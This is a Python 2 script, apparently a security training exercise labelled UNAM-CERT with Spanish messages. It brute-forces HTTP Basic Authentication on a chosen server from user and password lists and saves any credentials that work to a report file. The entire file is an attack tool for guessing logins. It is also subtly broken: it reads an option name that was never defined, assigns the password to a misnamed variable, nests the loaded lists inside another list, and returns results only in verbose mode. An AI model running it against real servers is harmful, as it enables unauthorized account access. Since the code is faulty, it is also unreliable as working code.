#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError

intentos = 0
success = []

def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked')
    parser.add_option('-U', '--user', dest='user', default=None, help='User or users file that will be tested during the attack')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password or passwords file list file that will be tested during the attack')
    parser.add_option('-v', '--verbose', default=False, help='Show details during execution')
    parser.add_option('-r', '--report', dest="destFile", default=None, help='File where results will be stored')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if options.password is None:
        printError('Debes especificar un password o lista de passwords.', True)
    if options.user is None:
        printError('Debes especificar un usuario(s) para atacar', True)

def reportResults(file, results, verbose):
    if verbose: print "\t\tGenerando archivo: ",file,'...'
    try:
        file = open(file, 'w')
        for r in results:
            file.write(r)
        file.close()
        if verbose: print "\t\tArchivo ",file,' generado con exito'
    except Exception as e:
        printError('Error al intentar generar el archivo')
        printError(e, True)

def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def getUsersAndPasswords(userOption, passwordOption):
    try:
        file = open(userOption, 'r')
        user = file.readlines()
    except IOError:
        user = userOption
    except Exception as e:
        printError('Error al intentar procesar el(los) usuario(s).')
        printError(e, True)
    try:
        file = open(passwordOption, 'r')
        password = file.readlines()
    except IOError:
        pwd = passwordOption
    except Exception as e:
        printError('Error al intentar procesar el(los) password(s).')
        printError(e, True)
    finally:
        return [user], [password]

def makeRequest(host, user, password, verbose):
    global intentos
    try:
        if verbose : print 'ATACANDO...'
        response = get(host, auth=(user,password))
        #print response
        #print dir(response)
        if verbose:
            if response.status_code == 200:
                print 'CREDENCIALES ENCONTRADAS!: ' + user + '\t' + password
                return 'CREDENCIALES ENCONTRADAS!: ' + user + '\t' + password
            else:
                print 'NO FUNCIONO :( '
                return False
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.', True)
    finally: 
        intentos += 1


if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        # print opts
        print "si paso archivo" if opts.File else "no paso archivo"
        users, passwords = getUsersAndPasswords(opts.user, opts.password)
        for user in users:
            for password in passwords:
                response = makeRequest(url, user, password, opts.verbose)
                if response and opts.File: success.append(response)
        if opts.verbose:
            print "\t\tEjecucion Finalizada "
            print "\t\tIntentos realizados: ",intentos
        if opts.File:
            reportResults(opts.File, success, opts.verbose)

    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)